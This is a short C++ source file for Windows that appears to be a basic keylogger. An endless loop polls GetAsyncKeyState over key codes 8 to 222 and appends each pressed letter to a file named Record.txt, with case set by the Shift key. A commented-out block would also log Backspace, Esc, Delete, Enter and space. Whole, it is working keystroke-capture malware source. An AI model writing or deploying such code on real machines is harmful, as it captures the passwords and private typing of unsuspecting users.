#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void log();

int main()	{
	log();
	return 0;	
}

void log()	{
	char key;
	
	for(;;)	{
		//Sleep(0);
		for(key=8;key<=222;key++){
			if (GetAsyncKeyState(key)==-32767)	{
			ofstream write ("Record.txt", ios::app);
			
			if((key>64)&&(key<91)&&!(GetAsyncKeyState(0x10)))	{
				key+=32;
				write<<key;
				write.close();
				break;
			}
			else if((key>64)&&(key<91))	{
				write<<key;
				write.close();
				break;
			}
			
			/*switch(key)	{
				case 8:	write<<"<BackSpace>";
						break;
				case 27:	write<<"<Esc>";
							break;
				case 127:	write<<"<Del>";
							break;
				case 32: write<<" ";
						 break;
				case 13:	write<<"<Enter>\n";
							break;
				default:	write<<key;
							break;
			} */
			}
		}
	}
}
